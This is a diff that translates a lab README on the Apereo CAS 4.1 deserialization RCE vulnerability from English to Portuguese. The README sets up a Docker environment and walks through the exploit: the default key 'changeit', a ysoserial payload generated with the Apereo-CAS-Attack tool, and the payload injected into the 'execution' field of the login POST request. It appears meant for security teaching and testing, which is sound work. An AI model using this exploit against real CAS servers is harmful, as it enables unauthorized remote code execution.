@@ -1,27 +1,24 @@
 # Apereo CAS 4.1 Deserialization RCE Vulnerability
 
-[中文版本(Chinese version)](README.zh-cn.md)
-[PT-BR(Portuguese version)](README.pt-br.md)
+Apereo CAS é um sistema de logon único empresarial. Há um problema nas tentativas do CAS de desserializar objetos por meio da biblioteca Apache Commons Collections, o que causou uma vulnerabilidade RCE.
 
-Apereo CAS is a enterprise single sign-on system. There is an issue in CAS’s attempts to deserialize objects via the Apache Commons Collections library, which cased a RCE vulnerability.
-
-Reference:
+Referência:
 
 - https://apereo.github.io/2016/04/08/commonsvulndisc/
 
-## Environment Setup
+## Configuração do ambiente
 
-Execute following commands to start an Apereo CAS 4.1.5：
+Execute os seguintes comandos para iniciar um Apereo CAS 4.1.5：
 
 ```
 docker-compose up -d
 ```
 
-After the Apereo CAS is started, visiting `http://your-ip:8080/cas/login` to see the login page.
+Depois que o Apereo CAS for iniciado, visite `http://your-ip:8080/cas/login` para ver a página de login.
 
-## Exploit
+## Explorando
 
-The out-of-the-box default configuration of Apereo CAS before 4.1.7, is using a default secret key `changeit`:
+A configuração padrão pronta para uso do Apereo CAS antes de 4.1.7, está usando uma chave secreta padrão `changeit`:
 
 ```java
 public class EncryptedTranscoder implements Transcoder {
@@ -41,7 +38,7 @@ public class EncryptedTranscoder implements Transcoder {
     // ...
 ```
 
-We can try to use [Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack) to generate a encrypted [ysoserial](https://github.com/frohoff/ysoserial)'s serialized object:
+Podemos tentar usar [Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack) para gerar um [ysoserial](https://github.com/frohoff/ysoserial) criptografado' s objeto serializado:
 
 ```
 java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
@@ -49,7 +46,7 @@ java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp
 
 ![](1.png)
 
-Then, intercept and modify the http request from login action of `/cas/login`, put the payload into `execution`'s value:
+Em seguida, intercepte e modifique a solicitação http da ação de login de `/cas/login`, coloque o payload no valor de `execution`:
 
 ```
 POST /cas/login HTTP/1.1
@@ -72,6 +69,6 @@ username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example
 
 ![](2.png)
 
-Congrats, `touch /tmp/success` has been successfully executed:
+Parabéns, `touch /tmp/success` foi executado com sucesso:
 
 ![](3.png)
